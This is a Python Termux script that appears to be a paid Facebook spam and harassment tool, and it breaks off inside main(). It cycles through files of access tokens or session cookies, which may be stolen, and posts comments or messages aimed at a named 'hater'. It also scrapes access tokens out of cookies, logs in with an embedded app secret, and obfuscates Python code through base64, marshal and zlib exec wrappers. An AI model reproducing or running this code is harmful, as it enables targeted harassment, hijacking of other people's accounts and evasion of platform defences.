import base64
import json
import re
import uuid
import io
import struct
import time
import urllib3
import requests
import colorama
from colorama import Fore, Back, Style, init
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import pyotp
import random
import string
import sys
import os
from urllib.parse import urlparse, parse_qs, unquote, quote
import pyfiglet
import rich
from rich import box
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
import marshal
import zlib
from rich.text import Text
import signal
import subprocess
import hashlib
from requests import exceptions

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
console = Console()

SAVE_DIR = '/sdcard/EncryptedFiles'
GITHUB_APPROVAL_URL = 'https://raw.githubusercontent.com/arshzainab90/Apruval.txt/main/approval.txt'

RED = '\x1b[1;31m'
GREEN = '\x1b[1;32m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
MAGENTA = '\x1b[1;35m'
CYAN = '\x1b[1;36m'
WHITE = '\x1b[1;37m'
RESET = '\x1b[0m'

PRIMARY_COLOR = Fore.CYAN
INPUT_COLOR = Fore.YELLOW
LINE_COLOR = Fore.MAGENTA
ERROR_COLOR = Fore.RED
SUCCESS_COLOR = Fore.GREEN
WHITE_COLOR = Fore.WHITE

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
]

ENABLE_PROXY = False
PROXIES = []

def get_random_proxy():
    if ENABLE_PROXY and PROXIES:
        return {
            'http': random.choice(PROXIES),
            'https': random.choice(PROXIES)
        }
    return None

def clear_screen():
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

def print_stylish_line():
    print(Style.BRIGHT + Fore.CYAN + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + Style.RESET_ALL)

def bold_unicode(text):
    return f"\033[1m{text}\033[0m"

def banner():
    clear_screen()
    try:
        text = pyfiglet.figlet_format('RahatZainab', font='soft')
    except:
        text = "RahatZainab"
    lines = text.split('\n')
    colors = [Fore.LIGHTCYAN_EX, Fore.LIGHTMAGENTA_EX, Fore.YELLOW, Fore.RED, Fore.LIGHTGREEN_EX, Fore.CYAN, Fore.MAGENTA]
    for i, line in enumerate(lines):
        if line.strip():
            print(Style.BRIGHT + colors[i % len(colors)] + line)

def get_unique_id():
    try:
        unique_str = str(os.getuid()) + os.getlogin() if os.name != 'nt' else str(os.getlogin())
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except:
        return hashlib.sha256(str(uuid.getnode()).encode()).hexdigest()

def send_approval_request(unique_key):
    message = f"Hello Rahat Zaīnab Sīīr!! Please Approve My Token: {unique_key}"
    url = f"https://wa.me/+917818956614?text={quote(message)}"
    try:
        os.system(f"am start '{url}' >/dev/null 2>&1")
    except:
        pass

def check_permission(unique_key):
    approved = False
    approval_requested = False
    print(Style.BRIGHT + Fore.CYAN + '[•] Checking Approval...')
    while not approved:
        try:
            response = requests.get(GITHUB_APPROVAL_URL)
            if response.status_code == 200:
                data = response.text
                if unique_key in data:
                    print(Style.BRIGHT + Fore.GREEN + '[✓] Your Approval successful.')
                    approved = True
                    break
                elif not approval_requested:
                    print(Style.BRIGHT + Fore.GREEN + '[•] Waiting For Approval...')
                    print_stylish_line()
                    print(Style.BRIGHT + Fore.YELLOW + f'[!] Your Key: {unique_key}')
                    approval_requested = True
                    send_approval_request(unique_key)
                time.sleep(5)
            else:
                print(f"[✘] Failed to fetch approval list. Status Code: {response.status_code}")
                time.sleep(10)
        except requests.RequestException:
            time.sleep(5)
            continue

def print_developer_info():
    console.print(Panel(
        f"{RED}[•] Developer    ▶ {GREEN}ARSH ALIYA                  \n"
        f"{GREEN}[•] Facebook     ▶ {RED}KHONI DARINDA ARSH BABA            \n"
        f"{YELLOW}[•] Github       ▶ {BLUE}arshzainab90              \n"
        f"{BLUE}[•] Team         ▶ {YELLOW}rahat Zainab rulex                 ",
        title=f"{CYAN}Developer Info",
        subtitle=f"{CYAN}rahatzainabrulex",
        style="bold cyan",
        width=70
    ))

def print_tool_info():
    console.print(Panel(
        f"{BLUE}[•] Tool Type    ▶ {YELLOW}Termux Post Convo        \n"
        f"{GREEN}[•] Version      ▶ {BLUE}8.07.06                  \n"
        f"{YELLOW}[•] Updates      ▶ {MAGENTA}Last Update On 29/Dec/2025",
        title=f"{CYAN}Tool Info",
        style="bold cyan",
        width=70
    ))

def print_subscription_info():
    console.print(Panel(
        f"{RED}[•] Access Type  ▶ {GREEN}Paid Tool                \n"
        f"{GREEN}[•] Monthly Plan ▶ {YELLOW}150 Rs / Month           \n"
        f"{YELLOW}[•] Yearly Plan  ▶ {MAGENTA}1500 Rs / Year           ",
        title=f"{CYAN}Subscription Info",
        style="bold cyan",
        width=70
    ))

def print_time_info():
    now = datetime.now()
    date = now.strftime('%Y-%m-%d')
    time_str = now.strftime('%I:%M:%S %p')
    console.print(Panel(
        f"{RED}[•] Time Now     ▶ {CYAN}{time_str}                \n"
        f"{YELLOW}[•] Today Date   ▶ {CYAN}{date}                    ",
        title=f"{CYAN}Today Time",
        style="bold cyan",
        width=70
    ))

def print_ip_info():
    try:
        res = requests.get('https://ipinfo.io/json', timeout=3)
        data = res.json()
        ip = data.get('ip', 'Unknown')
        country = data.get('country', 'Unknown')
        region = data.get('region', 'Unknown')
        city = data.get('city', 'Unknown')
        console.print(Panel(
            f"{GREEN}[•] IP           ▶ {ip}\n"
            f"{GREEN}[•] Country      ▶ {country}\n"
            f"{GREEN}[•] Region       ▶ {region}\n"
            f"{GREEN}[•] City         ▶ {city}n",
            title=f"{CYAN}IP Info",
            style="bold cyan",
            width=70
        ))
    except:
        pass

def display_boxes():
    print_developer_info()
    print_tool_info()
    print_time_info()
    print_subscription_info()
    print_ip_info()

def check_password():
    password = 'DEV HIJDE KA BAP MAJNU'
    attempts = 3
    while attempts > 0:
        print_stylish_line()
        entered_password = input(Style.BRIGHT + Fore.YELLOW + '[•] ENTER PASSWORD ▶ ')
        if entered_password == password:
            print(Style.BRIGHT + Fore.GREEN + '[✓] Password correct! Proceeding...')
            print_stylish_line()
            return True
        attempts -= 1
        print(Style.BRIGHT + Fore.RED + f'[✗] Incorrect password! You have {attempts} attempts left.')
        print_stylish_line()
    print(Style.BRIGHT + Fore.RED + '[✗] Too many incorrect attempts. Exiting')
    print_stylish_line()
    sys.exit(1)

def validate_tokens(token_file):
    valid_tokens = []
    invalid_tokens = []
    try:
        with open(token_file, 'r') as f:
            tokens = f.read().splitlines()
        for idx, token in enumerate(tokens, 1):
            if not token.strip(): continue
            try:
                url = f"https://graph.facebook.com/me?access_token={token}"
                response = requests.get(url)
                if response.status_code == 200:
                    data = response.json()
                    name = data.get('name', 'Unknown User')
                    valid_tokens.append((idx, token, name))
                    print(f"{GREEN}[✓] Token {idx} Valid: {name}")
                else:
                    invalid_tokens.append(token)
                    print(f"{RED}[✗] Token {idx} Invalid")
            except:
                invalid_tokens.append(token)
    except FileNotFoundError:
        print(f"{RED}[✗] File not found: {token_file}")
    return valid_tokens, invalid_tokens

def send_messages(valid_tokens, thread_id, haters_name, messages, delay):
    if not valid_tokens or not messages:
        return
    print_stylish_line()
    message_idx = 0
    token_idx = 0
    while True:
        try:
            token = valid_tokens[token_idx][1]
            account_name = valid_tokens[token_idx][2]
            msg_text = messages[message_idx]
            final_message = f"{haters_name} {msg_text}"
            url = f"https://graph.facebook.com/v15.0/t_{thread_id}/messages"
            headers = {
                'Authorization': f'Bearer {token}',
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json'
            }
            data = {'message': final_message}
            response = requests.post(url, headers=headers, json=data)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print_stylish_line()
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Thread ID  ▶ {thread_id}')
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Sender     ▶ {account_name}')
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Time       ▶ {timestamp}')
            if response.status_code == 200:
                print(Style.BRIGHT + SUCCESS_COLOR + '[✓] Status     ▶ Message Sent Successfully')
            else:
                print(Style.BRIGHT + ERROR_COLOR + f'[✗] Status     ▶ Message Failed ({response.status_code})')
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Message    ▶ {final_message}')
            print_stylish_line()
            message_idx = (message_idx + 1) % len(messages)
            token_idx = (token_idx + 1) % len(valid_tokens)
            time.sleep(delay)
        except KeyboardInterrupt:
            print(RED + "\n[!] Process stopped by user")
            break
        except Exception as e:
            print(RED + f"[!] Error: {str(e)}")
            time.sleep(2)

def post_comments(valid_tokens, post_id, haters_name, comments, delay):
    if not valid_tokens or not comments:
        return
    print_stylish_line()
    comment_idx = 0
    token_idx = 0
    while True:
        try:
            token = valid_tokens[token_idx][1]
            account_name = valid_tokens[token_idx][2]
            comment_text = comments[comment_idx]
            final_comment = f"{haters_name} {comment_text}"
            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            headers = {
                'Authorization': f'Bearer {token}',
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json'
            }
            data = {'message': final_comment}
            response = requests.post(url, headers=headers, json=data)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print_stylish_line()
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Post ID    ▶ {post_id}')
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Commenter  ▶ {account_name}')
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Time       ▶ {timestamp}')
            if response.status_code == 200:
                print(Style.BRIGHT + SUCCESS_COLOR + '[✓] Status     ▶ Comment Posted Successfully')
            else:
                print(Style.BRIGHT + ERROR_COLOR + f'[✗] Status     ▶ Comment Post Failed ({response.status_code})')
            print(Style.BRIGHT + SUCCESS_COLOR + f'[•] Comment    ▶ {final_comment}')
            print_stylish_line()
            comment_idx = (comment_idx + 1) % len(comments)
            token_idx = (token_idx + 1) % len(valid_tokens)
            time.sleep(delay)
        except KeyboardInterrupt:
            print(RED + "\n[!] Process stopped by user")
            break
        except Exception as e:
            print(RED + f"[!] Error: {str(e)}")
            time.sleep(2)

def make_folder():
    if not os.path.exists(SAVE_DIR):
        os.makedirs(SAVE_DIR)

def encrypt_base64(code):
    encoded = base64.b64encode(code.encode())
    return f"import base64\nexec(base64.b64decode({repr(encoded)}).decode())"

def encrypt_marshal(code):
    compiled = compile(code, '<string>', 'exec')
    marshaled = marshal.dumps(compiled)
    return f"import marshal\nexec(marshal.loads({repr(marshaled)}))"

def encrypt_zlib(code):
    compressed = zlib.compress(code.encode())
    return f"import zlib\nexec(zlib.decompress({repr(compressed)}).decode())"

def encrypt_all(code):
    compiled = compile(code, '<string>', 'exec')
    marshaled = marshal.dumps(compiled)
    compressed = zlib.compress(marshaled)
    encoded = base64.b64encode(compressed)
    return f"import zlib, marshal, base64\nexec(marshal.loads(zlib.decompress(base64.b64decode({repr(encoded)}))))"

def save_file(original_path, encrypted_code, suffix):
    make_folder()
    name = os.path.splitext(os.path.basename(original_path))[0]
    out_path = os.path.join(SAVE_DIR, f"{name}_{suffix}_encrypted.py")
    with open(out_path, 'w') as f:
        f.write(encrypted_code)
    print(f"{GREEN}[✓] Saved to: {out_path}")

def Enc():
    print(Style.BRIGHT + Fore.CYAN + '┏━━━━━━━━━━━━━━━━━━━━━━━━━━' + ' < ' + Fore.CYAN + '𝗘𝗡𝗖𝗥𝗬𝗣𝗧𝗢𝗥' + Fore.CYAN + ' > ' + '━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    print(Style.BRIGHT + Fore.YELLOW + '┃ ' + Style.BRIGHT + Fore.GREEN + '[1]' + ' 𝗕𝗮𝘀𝗲𝟲𝟰 𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻'.ljust(63) + Fore.BLUE + '┃')
    print(Style.BRIGHT + Fore.BLUE + '┃ ' + Style.BRIGHT + Fore.GREEN + '[2]' + ' 𝗠𝗮𝗿𝘀𝗵𝗮𝗹 𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻'.ljust(63) + Fore.YELLOW + '┃')
    print(Style.BRIGHT + Fore.RED + '┃ ' + Style.BRIGHT + Fore.GREEN + '[3]' + ' 𝗭𝗹𝗶𝗯 𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻'.ljust(63) + Fore.GREEN + '┃')
    print(Style.BRIGHT + Fore.GREEN + '┃ ' + Style.BRIGHT + Fore.GREEN + '[4]' + ' 𝗔𝗹𝗹 (𝗕𝗮𝘀𝗲𝟲𝟰 + 𝗠𝗮𝗿𝘀𝗵𝗮𝗹 + 𝗭𝗹𝗶𝗯)'.ljust(63) + Fore.MAGENTA + '┃')
    print(Style.BRIGHT + Fore.CYAN + '┃ ' + Style.BRIGHT + Fore.GREEN + '[5]' + ' 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂'.ljust(63) + Fore.CYAN + '┃')
    print(Style.BRIGHT + Fore.CYAN + '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛' + Style.RESET_ALL)
    print_stylish_line()
    choice = input(Fore.YELLOW + Style.BRIGHT + '[?] Enter your choice ▶ ').strip()
    if choice == '5':
        return
    path = input(Style.BRIGHT + Fore.YELLOW + '[+] Enter full path of .py file to encrypt ▶ ').strip()
    if not os.path.isfile(path):
        print(Fore.RED + Style.BRIGHT + '[✗] File not found.')
        return
    try:
        with open(path, 'r') as f:
            code = f.read()
        if choice == '1':
            save_file(path, encrypt_base64(code), 'base64')
        elif choice == '2':
            save_file(path, encrypt_marshal(code), 'marshal')
        elif choice == '3':
            save_file(path, encrypt_zlib(code), 'zlib')
        elif choice == '4':
            save_file(path, encrypt_all(code), 'all')
        else:
            print(RED + "Invalid Choice")
    except Exception as e:
        print(RED + f"Error: {e}")
    input("Press Enter...")

def start_loader():
    print(Style.BRIGHT + Fore.CYAN + '╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + bold_unicode(' Post Loader ') + '━━━━━━━━━━━━━━━━━━━━━━━━━━╮')
    token_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Token File Path ▶ ')
    print_stylish_line()
    post_id = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Facebook Post ID ▶ ')
    print_stylish_line()
    haters_name = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Haters Name ▶ ')
    print_stylish_line()
    comment_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Comment File Path ▶ ')
    print_stylish_line()
    try:
        delay = int(input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Time Delay (Seconds) ▶ '))
    except:
        delay = 5
    print_stylish_line()
    valid_tokens, _ = validate_tokens(token_file)
    if not valid_tokens:
        print(Style.BRIGHT + Fore.RED + '[✗] No valid tokens found. Exiting...')
        return
    try:
        with open(comment_file, 'r') as f:
            comments = f.read().splitlines()
    except FileNotFoundError:
        print(Style.BRIGHT + Fore.RED + '[✗] Comment file not found!')
        return
    post_comments(valid_tokens, post_id, haters_name, comments, delay)

def start_convo():
    print(Style.BRIGHT + Fore.CYAN + '╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + bold_unicode(' Convo Tool ') + '━━━━━━━━━━━━━━━━━━━━━━━━━━╮')
    token_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Token File Path ▶ ')
    print_stylish_line()
    thread_id = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Conversation (Thread) ID ▶ ')
    print_stylish_line()
    haters_name = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Haters Name ▶ ')
    print_stylish_line()
    message_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Message File Path ▶ ')
    print_stylish_line()
    try:
        delay = int(input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Time Delay (Seconds) ▶ '))
    except:
        delay = 5
    print_stylish_line()
    valid_tokens, _ = validate_tokens(token_file)
    if not valid_tokens:
        print(Style.BRIGHT + Fore.RED + '[X] No valid tokens found. Exiting...')
        return
    try:
        with open(message_file, 'r') as f:
            messages = f.read().splitlines()
    except FileNotFoundError:
        print(Style.BRIGHT + Fore.RED + '[✗] Message file not found!')
        return
    send_messages(valid_tokens, thread_id, haters_name, messages, delay)

def Wall():
    print(CYAN + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━ < COOKIES POST LOADER > ━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    cookie_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Cookie File Path ▶ ')
    post_id = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Facebook Post ID ▶ ')
    haters_name = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Haters Name ▶ ')
    comment_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Comment File Path ▶ ')
    try:
        delay = int(input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Time Delay (Seconds) ▶ '))
    except:
        delay = 5
    try:
        with open(cookie_file, 'r') as f:
            cookies = f.read().splitlines()
        with open(comment_file, 'r') as f:
            comments = f.read().splitlines()
    except Exception as e:
        print(RED + f"Error reading files: {e}")
        return
    if not cookies or not comments:
        print(RED + "Cookies or Comments empty")
        return
    idx_cookie = 0
    idx_comment = 0
    while True:
        try:
            cookie = cookies[idx_cookie]
            comment = comments[idx_comment]
            final_comment = f"{haters_name} {comment}"
            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            headers = {
                'Cookie': cookie,
                'User-Agent': random.choice(USER_AGENTS)
            }
            data = {'message': final_comment}
            print_stylish_line()
            print(f"{GREEN}[•] Posting with Cookie {idx_cookie + 1}")
            response = requests.post(url, headers=headers, data=data) 
            if response.status_code == 200:
                print(f"{GREEN}[✓] Comment Posted: {final_comment}")
            else:
                print(f"{RED}[✗] Failed ({response.status_code})")
            idx_cookie = (idx_cookie + 1) % len(cookies)
            idx_comment = (idx_comment + 1) % len(comments)
            time.sleep(delay)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(RED + f"Error: {e}")
            time.sleep(2)

def token_checker():
    print(Style.BRIGHT + Fore.GREEN + '[+] Enter the path to your token file ')
    token_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Token File Path ▶ ')
    print(Style.BRIGHT + Fore.GREEN + '[•] Validating tokens...')
    validate_tokens(token_file)
    input(Style.BRIGHT + Fore.MAGENTA + '[✔] Press Enter to return to menu ')

def fetch_gc_info():
    access_token = input(Style.BRIGHT + SUCCESS_COLOR + '[•] Enter your Facebook access token ▶ ')
    def get_group_name(group_id, token):
        try:
            url = f"https://graph.facebook.com/v17.0/{group_id}?access_token={token}&fields=name"
            res = requests.get(url)
            return res.json().get('name', f'Group {group_id}')
        except:
            return f'Group {group_id}'
    try:
        account_url = 'https://graph.facebook.com/v17.0/me'
        params = {'access_token': access_token, 'fields': 'name'}
        account_response = requests.get(account_url, params=params)
        if account_response.status_code != 200:
            print(RED + "[✗] Invalid Token")
            return
        account_name = account_response.json().get('name', 'Unknown')
        print_stylish_line()
        print(f"{CYAN}[✓] Account Name: {account_name}")
        url = 'https://graph.facebook.com/v17.0/me/conversations'
        params = {'access_token': access_token, 'fields': 'id,name'}
        response = requests.get(url, params=params)
        data = response.json()
        if 'data' in data:
            print(f"{GREEN}[✓] Total Chats Found: {len(data['data'])}")
            print_stylish_line()
            for idx, chat in enumerate(data['data'], 1):
                chat_id = chat['id'].replace('t_', '')
                chat_name = chat.get('name', get_group_name(chat_id, access_token))
                print(f"{idx}. {chat_name} (ID: {chat_id})")
        else:
            print(RED + "[✗] No conversations found.")
    except Exception as e:
        print(RED + f"[!] Error: {e}")
    input(Style.BRIGHT + Fore.MAGENTA + '[✔] Press Enter to continue ')

def extract_page_tokens():
    user_token = input(Style.BRIGHT + Fore.GREEN + '[•] Enter Your Facebook Token ▶ ').strip()
    try:
        r = requests.get(f"https://graph.facebook.com/me?access_token={user_token}&fields=id,name")
        data = r.json()
        if 'error' in data:
            print(RED + f"[!] Error: {data['error']['message']}")
            return
        print(GREEN + f"[✓] Name: {data.get('name')}")
        print(GREEN + f"[✓] ID: {data.get('id')}")
        print_stylish_line()
        r = requests.get(f"https://graph.facebook.com/me/accounts?access_token={user_token}")
        pages = r.json()
        if 'data' not in pages or not pages['data']:
            print(RED + "[!] No pages found.")
            return
        save_name = input(Style.BRIGHT + Fore.YELLOW + '[•] File name to save (e.g., pages) ▶ ').strip()
        filename = f"{save_name}.txt"
        with open(filename, 'w') as f:
            for page in pages['data']:
                token = page.get('access_token')
                name = page.get('name')
                print(GREEN + f"[+] Found Page: {name}")
                f.write(f"{token}\n")
        print(GREEN + f"[✓] Saved all page tokens to {filename}")
    except Exception as e:
        print(RED + f"[!] Error: {e}")
    input(Style.BRIGHT + Fore.MAGENTA + '[✔] Press Enter to continue ')

class FacebookTokenGenerator:
    def __init__(self, app_id, client_id, cookie):
        self.app_id = app_id
        self.client_id = client_id
        self.cookie_raw = cookie
        self.cookies = self._parse_cookies()
    def _parse_cookies(self):
        result = {}
        try:
            parts = self.cookie_raw.split(';')
            for part in parts:
                if '=' in part:
                    k, v = part.split('=', 1)
                    result[k.strip()] = v.strip()
        except:
            pass
        return result
    def GetToken(self):
        print(GREEN + "Extracted Cookies Info:")
        for k, v in self.cookies.items():
            print(f"{k}: {v}")
        if 'c_user' in self.cookies:
            print(f"UID: {self.cookies['c_user']}")

def run_token_generator():
    cookie = input(Style.BRIGHT + Fore.YELLOW + '[+] Enter Your Facebook Cookies ▶ ').strip()
    gen = FacebookTokenGenerator('275254692598279', '350685531728', cookie)
    gen.GetToken()
    input("Press Enter...")

def eaad_via_cookie():
    cookie = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Your Facebook Cookie ▶ ')
    try:
        url = 'https://www.facebook.com/events_manager2/overview'
        headers = {'Cookie': cookie, 'User-Agent': random.choice(USER_AGENTS)}
        res = requests.get(url, headers=headers)
        token_match = re.search(r'{"accessToken":"(EAAd\w+)"', res.text)
        if token_match:
            token = token_match.group(1)
            print(GREEN + f"[✓] EAAd Token Found: {token}")
        else:
            print(RED + "[✗] Token not found in cookie source.")
    except Exception as e:
        print(RED + f"[!] Error: {e}")
    input("Press Enter...")

def insta_token():
    print(CYAN + "Instagram Token (iPad) Extractor")
    cookies = input(Style.BRIGHT + Fore.YELLOW + '[•] Enter Facebook Cookies ▶ ').strip()
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept-Encoding': 'gzip, deflate, br',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'Cookie': cookies
    }
    try:
        response = requests.get("https://www.instagram.com/accounts/signup/", headers=headers)
        fb_ar = response.headers.get('fb-ar')
        if fb_ar:
             print(GREEN + f"[✓] FB-AR Header Found: {fb_ar}")
        else:
             print(RED + "[✗] FB-AR Header Not Found")
    except Exception as e:
        print(RED + f"Error: {e}")
    input("Press Enter...")

def login_token_menu():
    email = input(Style.BRIGHT + Fore.CYAN + '[›] Enter Email/Username ▶ ')
    password = input(Style.BRIGHT + Fore.CYAN + '[›] Enter Password ▶ ')
    try:
        data = {
            'email': email,
            'password': password,
            'credentials_type': 'password',
            'format': 'json',
            'generate_session_cookies': '1',
            'method': 'auth.login',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        r = requests.post("https://api.facebook.com/method/auth.login", data=data)
        res = r.json()
        if 'access_token' in res:
            print(GREEN + f"[✓] Token: {res['access_token']}")
        else:
            print(RED + f"[✗] Failed: {res.get('error_msg')}")
    except Exception as e:
        print(RED + f"Error: {e}")
    input("Press Enter...")

def Token_by_2fa():
    print(YELLOW + "2FA Login is currently simplified to standard login check.")
    login_token_menu()

def comment_by_page():
    print(Style.BRIGHT + Fore.CYAN + '╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + bold_unicode(' Page Post Loader ') + '━━━━━━━━━━━━━━━━━━━━━━━━━━╮')
    token_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Page Token File Path ▶ ')
    post_id = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Facebook Post ID ▶ ')
    haters_name = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Haters Name ▶ ')
    comment_file = input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Comment File Path ▶ ')
    try:
        delay = int(input(Style.BRIGHT + INPUT_COLOR + '[•] Enter Time Delay (Seconds) ▶ '))
    except:
        delay = 5
    valid_tokens, _ = validate_tokens(token_file)
    if not valid_tokens:
        print(Style.BRIGHT + Fore.RED + '[✗] No valid page tokens found.')
        return
    try:
        with open(comment_file, 'r') as f:
            comments = f.read().splitlines()
    except:
        return
    post_comments(valid_tokens, post_id, haters_name, comments, delay)

def cookies_checker_menu():
    print(YELLOW + "[!] Cookie Checker")
    cookie = input("Enter Cookie: ")
    eaad_via_cookie()

def show_menu():
    while True:
        banner()
        display_boxes()
        print_stylish_line()
        print(Style.BRIGHT + Fore.CYAN + '╭─━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + bold_unicode(' < MENU > ') + '━━━━━━━━━━━━━━━━━━━━━━━━━━━─╮')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[01]' + bold_unicode(' Encryptor').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[02]' + bold_unicode(' Check Token').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[03]' + bold_unicode(' Check Cookies').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[04]' + bold_unicode(' Fetch Gc UID').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[05]' + bold_unicode(' Get Page Token').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[06]' + bold_unicode(' Run Post Loader').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[07]' + bold_unicode(' Run Convo Loader').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[08]' + bold_unicode(' Cookies Post Loader').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[09]' + bold_unicode(' Get EAAD6 Token (via Cookies)').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[10]' + bold_unicode(' Get Eaad Token By Cookies (Normal)').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[11]' + bold_unicode(' Get EAABwz Token By Cookies (iPad)').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[12]' + bold_unicode(" Get EAAAU Token By FB Login").ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[13]' + bold_unicode(' Get EAAD6 Token + Cookies By 2FA').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.GREEN + '[14]' + bold_unicode(' Run Post Loader Using Page Id Token').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.MAGENTA + '┃ ' + Style.BRIGHT + Fore.RED + '[15]' + bold_unicode(' EXIT').ljust(62) + Fore.MAGENTA + '┃')
        print(Style.BRIGHT + Fore.CYAN + '╰─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╯' + Style.RESET_ALL)
        print_stylish_line()
        choice = input(Style.BRIGHT + INPUT_COLOR + '[?] 𝗖𝗵𝗼𝗼𝘀𝗲 𝗔𝗻 𝗢𝗽𝘁𝗶𝗼𝗻 ▶ ')
        print_stylish_line()
        if choice == '1': Enc()
        elif choice == '2': token_checker()
        elif choice == '3': cookies_checker_menu()
        elif choice == '4': fetch_gc_info()
        elif choice == '5': extract_page_tokens()
        elif choice == '6': start_loader()
        elif choice == '7': start_convo()
        elif choice == '8': Wall()
        elif choice == '9': run_token_generator()
        elif choice == '10': eaad_via_cookie()
        elif choice == '11': insta_token()
        elif choice == '12': login_token_menu()
        elif choice == '13': Token_by_2fa()
        elif choice == '14': comment_by_page()
        elif choice == '15':
            print(RED + "Exiting... Goodbye!")
            sys.exit()
        else:
            print(RED + "Invalid Option")
            time.sleep(1)

def main():
    try:
        banner()
        display_boxes()
